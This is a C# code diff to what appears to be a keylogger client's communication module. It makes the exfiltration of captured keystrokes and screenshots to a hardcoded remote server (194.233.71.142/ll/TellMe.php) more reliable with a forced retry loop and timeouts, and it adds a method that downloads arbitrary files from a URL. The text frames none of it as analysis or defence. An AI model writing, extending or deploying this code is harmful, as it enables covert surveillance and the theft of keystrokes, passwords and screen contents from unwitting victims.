@@ -16,26 +16,28 @@ namespace Client.Communication
         /// <summary>
         /// The server's endpoint.
         /// </summary>
-        
+
         private static string API = "http://194.233.71.142/ll/TellMe.php";
 
-        public async static Task<bool> AsyncSendKeylogs(string logged, string username) {
+        public async static Task<bool> AsyncSendKeylogs(string logged, string username, bool force = false)
+        {
             bool result = false;
             await Task.Run(() =>
             {
-                try
+                do
                 {
-                    HttpClient httpClient = new HttpClient();
-                    MultipartFormDataContent form = new MultipartFormDataContent();
-                    form.Add(new StringContent(logged), "logs");
-                    HttpResponseMessage response = httpClient.PostAsync($"{API}?username=\"{HttpUtility.UrlEncode(username)}\"&type=logs", form).Result;
-                    httpClient.Dispose();
-                    result = true;
-                }
-                catch
-                {
-                    result = false;
-                }
+                    try
+                    {
+                        MultipartFormDataContent form = new MultipartFormDataContent();
+                        form.Add(new StringContent(logged), "logs");
+
+                        HttpClient httpClient = new HttpClient();
+                        httpClient.Timeout = TimeSpan.FromSeconds(10);
+                        httpClient.PostAsync($"{API}?username=\"{HttpUtility.UrlEncode(username)}\"&type=logs", form).Wait();
+                        result = true;
+                    }
+                    catch { result = false; }
+                } while (force && !result);
             });
             return result;
         }
@@ -46,11 +48,12 @@ namespace Client.Communication
             {
                 try
                 {
-                    HttpClient httpClient = new HttpClient();
                     MultipartFormDataContent form = new MultipartFormDataContent();
                     form.Add(new ByteArrayContent(image_buffer, 0, image_buffer.Length), "file", "file");
-                    HttpResponseMessage response = httpClient.PostAsync($"{API}?username=\"{HttpUtility.UrlEncode(username)}\"&type=screenshot", form).Result;
-                    httpClient.Dispose();
+
+                    HttpClient httpClient = new HttpClient();
+                    httpClient.Timeout = TimeSpan.FromSeconds(10);
+                    httpClient.PostAsync($"{API}?username=\"{HttpUtility.UrlEncode(username)}\"&type=screenshot", form).Wait();
                     result = true;
                 }
                 catch
@@ -59,6 +62,18 @@ namespace Client.Communication
                 }
             });
             return result;
+        }
+
+        public async static Task<string> AsyncDownloadFile(string url, string filename)
+        {
+            await Task.Run(() =>
+            {
+                using (var client = new WebClient())
+                {
+                    client.DownloadFile(url, filename);
+                }
+            });
+            return filename;
         }
     }
 }
